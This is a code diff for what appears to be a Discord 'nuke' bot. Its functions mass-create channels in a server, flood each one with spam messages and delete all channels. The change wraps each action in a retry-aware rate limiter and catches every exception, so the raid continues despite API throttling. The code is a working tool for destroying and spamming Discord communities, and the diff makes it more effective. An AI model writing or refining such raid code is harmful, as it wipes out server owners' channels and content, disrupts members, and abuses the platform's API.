@@ -12,14 +12,15 @@ async def create_channels_and_spam(
     
     async def create_channel():
         try:
-            await rate_limiter.acquire("create_channel")
-            channel = await guild.create_text_channel(Nuke.channel_name)
+            channel = await rate_limiter.execute_with_retry(
+                "create_channel",
+                guild.create_text_channel,
+                Nuke.channel_name
+            )
             created_channels.append(channel)
             return channel
-        except discord.HTTPException:
+        except Exception:
             return None
-        finally:
-            rate_limiter.release()
     
     tasks = [create_channel() for _ in range(Nuke.channel_count)]
     results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -28,12 +29,13 @@ async def create_channels_and_spam(
     async def spam_channel(channel: discord.TextChannel):
         for _ in range(Nuke.spam_count):
             try:
-                await rate_limiter.acquire(f"spam_{channel.id}")
-                await channel.send(Nuke.spam_message)
-            except discord.HTTPException:
+                await rate_limiter.execute_with_retry(
+                    f"spam_{channel.id}",
+                    channel.send,
+                    Nuke.spam_message
+                )
+            except Exception:
                 pass
-            finally:
-                rate_limiter.release()
     
     spam_tasks = [spam_channel(channel) for channel in created_channels]
     await asyncio.gather(*spam_tasks, return_exceptions=True)
@@ -46,13 +48,13 @@ async def delete_channels(guild: discord.Guild) -> int:
     
     async def delete_channel(channel):
         try:
-            await rate_limiter.acquire(f"delete_{channel.id}")
-            await channel.delete()
+            await rate_limiter.execute_with_retry(
+                f"delete_{channel.id}",
+                channel.delete
+            )
             return True
-        except discord.HTTPException:
+        except Exception:
             return False
-        finally:
-            rate_limiter.release()
     
     tasks = [delete_channel(channel) for channel in channels]
     results = await asyncio.gather(*tasks, return_exceptions=True)
